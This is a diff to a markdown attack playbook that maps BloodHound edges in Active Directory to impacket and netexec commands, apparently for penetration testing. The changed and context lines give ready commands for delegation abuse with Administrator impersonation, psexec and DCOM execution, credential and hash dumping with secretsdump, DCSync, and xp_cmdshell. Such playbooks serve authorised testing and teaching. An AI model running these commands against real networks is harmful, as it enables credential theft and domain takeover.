@@ -109,9 +109,9 @@ Each arrow is an edge; the next phase walks each edge with the right tool.
 | `AllowedToAct` (RBCD) | Resource-Based Constrained Delegation | `impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'attacker$' -computer-pass 'P@ss'`; `impacket-rbcd -delegate-from 'attacker$' -delegate-to '$TARGET' "$DOMAIN/$USER:$PASS"`; `impacket-getST -spn cifs/$TARGET -impersonate Administrator '$DOMAIN/attacker$:P@ss'` |
 | `AdminTo` (on computer) | Local admin on the target | `impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET_IP"`; or `impacket-secretsdump` for hash extraction |
 | `HasSession` (target user logged on to a host) | Get local admin on the host -> dump session creds | `impacket-secretsdump "$DOMAIN/$USER:$PASS@$HOST"` (after gaining AdminTo on $HOST) |
-| `CanRDP` | RDP into the host | `xfreerdp /u:$USER /p:$PASS /v:$HOST` |
+| `CanRDP` | RDP into the host | `nxc rdp $HOST -u $USER -p $PASS -x 'whoami /priv'` |
 | `CanPSRemote` | WinRM remote PowerShell | `nxc winrm $HOST -u $USER -p $PASS -X 'whoami /priv'` |
-| `ExecuteDCOM` | DCOM exec on the host | `impacket-dcomexec "$DOMAIN/$USER:$PASS@$HOST"` |
+| `ExecuteDCOM` | DCOM exec on the host | `dcomexec.py "$DOMAIN/$USER:$PASS@$HOST"` |
 | `SQLAdmin` | xp_cmdshell on a SQL server | `mssqlclient.py "$DOMAIN/$USER:$PASS@$SQL_HOST" -windows-auth`; then `enable_xp_cmdshell` and `xp_cmdshell` |
 | `GetChanges` + `GetChangesAll` | DCSync rights | `impacket-secretsdump -just-dc-ntlm "$DOMAIN/$USER:$PASS@$DC_IP"` |
 | `GetChangesInFilteredSet` | Limited DCSync (RODC-style) | Same command; output may be filtered |
@@ -241,7 +241,7 @@ LAPS password retrieved            -> direct local admin on the host -> /skill l
 ## Pro tips
 
 - Mark the new principal as `owned` BEFORE re-running `path-to-da`. Otherwise the path-finder won't use the shorter chain.
-- BloodHound collection is a snapshot; ACLs change. Always confirm a critical edge with a real probe (`dacledit -action read`, `secretsdump --just-files-cab`, etc.) before relying on it.
+- BloodHound collection is a snapshot; ACLs change. Always confirm a critical edge with a real probe (`impacket-dacledit -action read`, etc.) before relying on it.
 - `-c All,LoggedOn` is loud but reveals `HasSession` edges that are gold for credential-theft chains. Tradeoff per engagement.
 - For large environments, run `bloodhound-python` with `--zip` and load multiple zips into bhgraph; merging is automatic.
 - The `MemberOf` edge is passive: do not "walk" it. Continue to the next edge in the chain.
